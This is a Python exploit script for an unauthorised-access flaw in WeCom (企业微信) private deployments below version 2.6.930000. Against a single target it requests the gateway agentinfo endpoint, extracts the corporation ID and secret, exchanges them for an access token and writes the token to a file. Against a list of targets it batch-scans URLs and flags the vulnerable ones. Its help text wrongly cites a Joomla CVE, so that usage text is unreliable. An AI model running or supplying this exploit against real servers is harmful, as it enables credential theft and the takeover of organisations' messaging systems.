"""
-*- coding: utf-8 -*-
@Project : 企业微信未授权访问
@Version : 2.5.x版本2.6.930000 版本以下
@Author  : wodelilian
@Date    : 2023/8/12 00:19
Software : PyCharm
version  : Python 3.10
@File    : WeChat.py
"""
import json
import requests
import argparse


payload1 = 'cgi-bin/gateway/agentinfo'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'
}


def checktarget(pattern, url):
    """
    :param pattern: 漏扫模式：单独/批量
    :param url: 目标URL
    :return:
    """
    if str(url[-1]) != "/":
        url = url + "/"
    else:
        pass
    if str(pattern) == 'alone':
        try:
            url1 = '{}{}'.format(url,  payload1)
            response = requests.get(url=url1, headers=headers, verify=False)
            state = response.status_code
            if state == 200:
                print('payload1响应成功，目标地址可能存在漏洞，尝试获取更多配置文件信息')
                responseinfo = json.loads(response.text)
                corpid = ''.join(responseinfo['strcorpid'])
                secret = ''.join(responseinfo['Secret'])
                payload2 = 'cgi-bin/gettoken?corpid={}&corpsecret={}'.format(corpid, secret)
                url2 = '{}{}'.format(url, payload2)
                moreresponse = requests.get(url=url2, headers=headers, verify=False)
                responseinfo = json.loads(moreresponse.text)
                f = open('data.txt', 'w')
                f.write(json.dumps(responseinfo, indent=4))
                f.close()
                print("数据已写入当前路径下data.txt中，请注意查看")
        except Exception as e:
            print(e)
            print('当前IP执行失败，可能不存在该漏洞！')
    else:
        list = openfile(url)
        try:
            for i in list:
                url = '{}{}'.format(i, payload1)
                response = requests.get(url=url, headers=headers, verify=False)
                state = response.status_code
                if state == 200:
                    print('当前URL可能存在漏洞，请手动核实：' + url)
                else:
                    print("当前URL不存在漏洞，pass")
        except Exception as e:
            print(e)


def openfile(filepath):
    """
    :param filepath: 传入读取文件地址
    :return: 返回文件中的URL
    """
    urllist = []  # 定义一个空列表用来返回URL
    with open(filepath) as f:
        for url in f.readlines():
            url = url.replace("\n", "")
            if url != "":
                urllist.append(url)
    return urllist


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='python3 joomla(CVE-2023-23752).py -r [Pattern(alone list)] -u [IP Address] ',
        epilog='python3 -r alone -u 127.0.0.1 ')
    parser.add_argument('-r', '--run',  help='Pattern(alone list)')
    parser.add_argument('-u', '--url',  help='Destination IP address or IP filepath')
    args = parser.parse_args()
    pattern = args.run
    url = args.url
    print(
        f"Author: Wodelilian\n"
        f"                                                     ,--,              ,--,                                    \n"
        f"                                    ,---,          ,--.'|     ,--,   ,--.'|     ,--,                           \n"
        f"               .---.   ,---.      ,---.'|          |  | :   ,--.'|   |  | :   ,--.'|                     ,---,  \n"
        f"              /. ./|  '   ,'\     |   | :          :  : '   |  |,    :  : '   |  |,                  ,-+-. /  | \n"
        f"           .-'-. ' | /   /   |    |   | |   ,---.  |  ' |   `--'_    |  ' |   `--'_      ,--.--.    ,--.'|'   | \n"
        f"          /___/ \: |.   ; ,. :  ,--.__| |  /     \ '  | |   ,' ,'|   '  | |   ,' ,'|    /       \  |   |  , ' | \n"
        f"       .-'.. '   ' .'   | |: : /   ,'   | /    /  ||  | :   '  | |   |  | :   '  | |   .--.  .-. | |   | /  | | \n"
        f"      /___/ \:     ''   | .; :.   '  /  |.    ' / |'  : |__ |  | :   '  : |__ |  | :    \__\/: . . |   | |  | | \n"
        f"      .   \  ' .\   |   :    |'   ; |:  |'   ;   /||  | '.'|'  : |__ |  | '.'|'  : |__  ,  .--.; | |   | |  |/  \n"
        f"       \   \   ' \ | \   \  / |   | '/  ''   |  / |;  :    ;|  | '.'|;  :    ;|  | '.'|/  /  ,.  | |   | |--'   \n"
        f"        \   \  |--    `----'  |   :    :||   :    ||  ,   / ;  :    ;|  ,   / ;  :    ;  :   .'   \|   |/       \n"
        f"         \   \ |               \   \  /   \   \  /  ---`-'  |  ,   /  ---`-'  |  ,   /|  ,     .-./'---'        \n"
        f"          '---                  `----'     `----'            ---`-'            ---`-'  `--`---'                 \n"
    )
    checktarget(pattern, url)
